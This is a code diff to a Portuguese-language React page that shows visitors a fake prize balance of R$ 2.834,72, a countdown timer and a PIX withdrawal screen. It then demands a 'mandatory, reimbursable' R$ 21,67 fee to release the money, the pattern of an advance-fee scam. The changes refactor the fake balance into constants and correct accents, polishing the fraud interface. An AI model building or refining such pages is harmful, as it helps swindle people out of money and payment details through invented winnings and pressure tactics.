@@ -3,10 +3,16 @@ import '../styles/app.css';
 
 // Currency animation helper
 const formatBR = (value: number) => {
-  return value.toFixed(2).replace(".", ",").replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+  return value
+    .toFixed(2)
+    .replace('.', ',')
+    .replace(/\B(?=(\d{3})+(?!\d))/g, '.');
 };
 
 const easeOutCubic = (t: number) => 1 - Math.pow(1 - t, 3);
+
+const SALDO_FINAL = 2834.72;
+const SALDO_PONTOS = '28.347.200';
 
 const Index = () => {
   const [currentScreen, setCurrentScreen] = useState('one');
@@ -71,7 +77,7 @@ const Index = () => {
   // Show popup after screen one loads
   useEffect(() => {
     if (currentScreen === 'one') {
-      animateCurrency(2834.72);
+      animateCurrency(SALDO_FINAL);
       const timeout = setTimeout(() => {
         setShowPopupTwo(true);
         setSacarEnabled(true);
@@ -230,7 +236,7 @@ const Index = () => {
             <div className="parabens-txt">
               <span className="parabens-txtum">Parabéns!</span>
               <span className="parabens-txtdois">Você concluiu <span className="nobreak">todas as tarefas</span></span>
-              <span className="parabens-valor">R$ 2.834,72</span>
+              <span className="parabens-valor">R$ {formatBR(SALDO_FINAL)}</span>
             </div>
             <img src="/images/parabens-img.png" alt="" className="parabens-img" />
           </div>
@@ -383,7 +389,7 @@ const Index = () => {
               <img src="/images/gol.png" alt="" className="gol-img" />
               <span className="gol">Gol de Prêmios</span>
               <span className="gol-txt">Parabéns! Como parte de uma campanha de recompensas exclusiva.</span>
-              <span className="valor-currency gol-valor valor-currency-dois valor-currency-quatro">{animatedValue}</span>
+              <span className="valor-currency gol-valor valor-currency-dois valor-currency-quatro">R$ {formatBR(SALDO_FINAL)}</span>
               <div className="timer-wrapper expira-em-popup" style={{ background: 'none' }}>
                 <div className="timer-label">Expira em</div>
                 <div className="timer-clock">
@@ -420,8 +426,8 @@ const Index = () => {
                 <span className="saldo-text saldo-text-dois">Seu saldo</span>
               </div>
               <div className="saldo-valor saldo-valor-dois">
-                <span className="valor-currency valor-currency-dois">R$2.834,72</span>
-                <span className="total-pontos">= 28.347.200 pontos (s)</span>
+                <span className="valor-currency valor-currency-dois">R$ {formatBR(SALDO_FINAL)}</span>
+                <span className="total-pontos">= {SALDO_PONTOS} pontos</span>
               </div>
             </div>
             <div className="saldo-action">
@@ -450,7 +456,7 @@ const Index = () => {
               </div>
               <div className="saldo-valor">
                 <span className="transferencia-txt">
-                  <img src="/images/fi-rs-credit-card.png" alt="" />Transferencia via /
+                  <img src="/images/fi-rs-credit-card.png" alt="" />Transferência via /
                   <img src="/images/pix-logo.svg" alt="" className="pix-logo-transf" />
                 </span>
               </div>
@@ -466,7 +472,7 @@ const Index = () => {
               ))}
             </div>
             <button className={`btn-valor display-total ${selectedValue === 'total' ? 'btn-active' : ''}`} onClick={() => handleSelectValue('total')}>
-              R$2.834,72
+              R$ {formatBR(SALDO_FINAL)}
             </button>
           </div>
           
@@ -480,7 +486,7 @@ const Index = () => {
           </button>
           
           <div className="obtem obtem-sacar sacar-dinheiro">
-            <span className="obtem-txt">Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os limites de saque para transações individuais e mensais podem variar conforme o pais ou região.</span>
+            <span className="obtem-txt">Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os limites de saque para transações individuais e mensais podem variar conforme o país ou região.</span>
           </div>
         </div>
         
@@ -518,7 +524,7 @@ const Index = () => {
             <span className="btn-text btn-indis">Indisponível</span>
           </button>
           <div className="obtem obtem-sacar">
-            <span className="obtem-txt recarga-txt">Voce precisa de um saldo mínimo de R$10 para recarga de celular</span>
+            <span className="obtem-txt recarga-txt">Você precisa de um saldo mínimo de R$10 para recarga de celular</span>
           </div>
         </div>
       </section>
@@ -637,7 +643,7 @@ const Index = () => {
           
           <div className="confirmation-section confirmation-balance">
             <div className="confirmation-balance-title">SALDO DISPONÍVEL</div>
-            <div className="confirmation-balance-amount">R$ 2.834,72</div>
+            <div className="confirmation-balance-amount">R$ {formatBR(SALDO_FINAL)}</div>
             <div className="confirmation-balance-subtitle">Aguardando confirmação para saque</div>
           </div>
           
@@ -647,7 +653,7 @@ const Index = () => {
               R$ 21,67 <span className="confirmation-reembolso-badge">VALOR REEMBOLSÁVEL</span>
             </div>
             <div className="confirmation-fee-description">
-              Taxa obrigatória para liberação do saque no valor de <span className="bold">R$2.834,72</span>. O valor de <span className="bold">R$21,67</span> será reembolsado integralmente para você em 1 minuto.
+              Taxa obrigatória para liberação do saque no valor de <span className="bold">R$ {formatBR(SALDO_FINAL)}</span>. O valor de <span className="bold">R$21,67</span> será reembolsado integralmente para você em 1 minuto.
             </div>
           </div>
           
@@ -668,7 +674,7 @@ const Index = () => {
               </div>
               <div className="confirmation-receipt-item">
                 <div className="confirmation-receipt-label">Valor a receber</div>
-                <div className="confirmation-receipt-value bold">R$ 2.834,72</div>
+                <div className="confirmation-receipt-value bold">R$ {formatBR(SALDO_FINAL)}</div>
               </div>
               <div className="confirmation-pix-key">{chavePix}</div>
             </div>
@@ -697,7 +703,7 @@ const Index = () => {
                 <div className="confirmation-requirement-icon">3</div>
                 <div className="confirmation-requirement-content">
                   <div className="confirmation-requirement-title">Acessar saldo completo</div>
-                  <div className="confirmation-requirement-description">R$ 2.834,72 liberado para saque</div>
+                  <div className="confirmation-requirement-description">R$ {formatBR(SALDO_FINAL)} liberado para saque</div>
                 </div>
               </div>
             </div>
